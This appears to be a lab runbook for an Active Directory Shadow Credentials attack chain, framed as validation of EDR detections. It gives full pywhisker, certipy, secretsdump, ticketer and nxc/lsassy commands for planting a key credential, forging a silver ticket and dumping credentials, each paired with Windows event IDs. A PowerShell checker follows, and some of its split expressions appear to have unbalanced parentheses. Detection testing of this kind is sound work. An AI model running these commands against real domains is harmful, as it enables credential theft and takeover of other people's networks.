# Zero-Endpoint-Code Shadow Credentials Attack Chain

## Environment Setup (Kali Attack Machine)

```bash
# Set environment variables (adjust to your lab)
export DOMAIN="sme.local"
export USER="Administrator"  
export PASS="YourPassword"
export DC_IP="10.0.0.206"
export TARGET="EC2AMAZ-V903HM1"  # Your target computer name
export PROXY="proxychains4"

# Verify tools are installed
which pywhisker certipy lookupsid.py ticketer.py nxc

# Install if missing
pip install pywhisker certipy-ad impacket netexec
```

## Complete Six-Step Attack Chain

### Step 1: Remote List Existing KeyCredentials
```bash
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action list
```
**EDR Check**: Look for Event 5136 on DC (Directory Service Changes)

### Step 2: Remote Implant Attacker Public Key (Core Attack)
```bash
mkdir -p /tmp/sc_edr_demo
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action add --filename /tmp/sc_edr_demo/shadow.pfx --password ComplexP@ssw0rd123!
```
**EDR Check**: Immediate check for Event 5136 (msDS-KeyCredentialLink modification)

### Step 3: PKINIT Authentication to Get TGT
```bash
$PROXY certipy auth -pfx /tmp/sc_edr_demo/shadow.pfx -dc-ip $DC_IP -domain $DOMAIN -username $TARGET
```
**EDR Check**: Event 4768 (Kerberos TGT Request) - KDC_ERR_PADATA_TYPE_NOSUPP still counts as success

### Step 4: Dump NT Hash for Silver Ticket
```bash
# Get target NT hash and domain SID
$PROXY secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user $TARGET$
```
**EDR Check**: Events 4624 (logon success) and 4769 (service ticket request)

### Step 5: Forge Silver Ticket
```bash
# Set variables from Step 4 output
export TARGET_HASH="<NT_hash_from_step4>"
export DOMAIN_SID="S-1-5-21-..."  # Get from step4

ticketer.py -nthash $TARGET_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$TARGET.$DOMAIN Administrator -outputfile /tmp/sc_edr_demo/administrator.ccache
```
**EDR Check**: Abnormal 4769 events with forged PAC signatures

### Step 6: Actual File Access with Forged Ticket
```bash
# Import ticket
export KRB5CCNAME=/tmp/sc_edr_demo/administrator.ccache

# Enumerate shares and access files
$PROXY nxc smb $TARGET.$DOMAIN -u Administrator -k --use-kcache --shares
$PROXY nxc smb $TARGET.$DOMAIN -u Administrator -k --use-kcache -M lsassy
```
**EDR Check**: Event 5145 (network file access) - validates lateral movement detection

## EDR Validation PowerShell Script

Run on DC after each step:

```powershell
# Quick event validation after each step
$startTime = (Get-Date).AddMinutes(-5)

Write-Host "=== Checking Shadow Credentials Events ===" -ForegroundColor Yellow

# 5136 - Directory Service Changes (Shadow Credentials implant)
Write-Host "`nEvent 5136 (msDS-KeyCredentialLink):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5136;StartTime=$startTime} | 
Where-Object {$_.Message -like '*msDS-KeyCredentialLink*'} | 
Select TimeCreated, @{N='Target';E={($_.Message -split 'ObjectDN:\s*')[1] -split '\s*\n')[0]}} | 
Format-Table -AutoSize

# 4768 - Kerberos TGT Request
Write-Host "`nEvent 4768 (Kerberos TGT):" -ForegroundColor Cyan  
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4768;StartTime=$startTime} |
Where-Object {$_.Message -like "*$env:TARGET*"} |
Select TimeCreated, @{N='User';E={($_.Message -split 'Account Name:\s*')[1] -split '\s*\n')[0]}} |
Format-Table -AutoSize

# 4769 - Service Ticket Request  
Write-Host "`nEvent 4769 (Service Ticket):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769;StartTime=$startTime} |
Where-Object {$_.Message -like '*Administrator*'} |
Select TimeCreated, @{N='Service';E={($_.Message -split 'Service Name:\s*')[1] -split '\s*\n')[0]}} |
Format-Table -AutoSize

# 5145 - File Share Access
Write-Host "`nEvent 5145 (File Access):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5145;StartTime=$startTime} |
Where-Object {$_.Message -like '*cifs*'} |
Select TimeCreated, @{N='Share';E={($_.Message -split 'Share Name:\s*')[1] -split '\s*\n')[0]}} |
Format-Table -AutoSize
```

## Zero-Endpoint-Code Validation Points

1. **No local code execution** - All operations via LDAP + Kerberos protocols
2. **5136 detection** - Validates AD modification monitoring  
3. **4768 detection** - Validates Kerberos authentication anomaly detection
4. **4769 detection** - Validates service ticket abuse detection
5. **5145 detection** - Validates lateral movement via file share access

## Success Criteria

- [ ] Event 5136 generated on Step 2 (Shadow Credentials implant)
- [ ] Event 4768 generated on Step 3 (PKINIT attempt) 
- [ ] Event 4769 generated on Step 4/5 (ticket abuse)
- [ ] Event 5145 generated on Step 6 (file access)
- [ ] All events contain correct target identification
- [ ] EDR alerts triggered for anomalous Kerberos activity

## Cleanup

```bash
# Remove Shadow Credentials
$PROXY pywhisker -d $DOMAIN -u $USER -p $PASS --dc-ip $DC_IP -t $TARGET$ --action remove --device-id <device_id_from_list>

# Clear local artifacts
rm -rf /tmp/sc_edr_demo/
unset KRB5CCNAME
```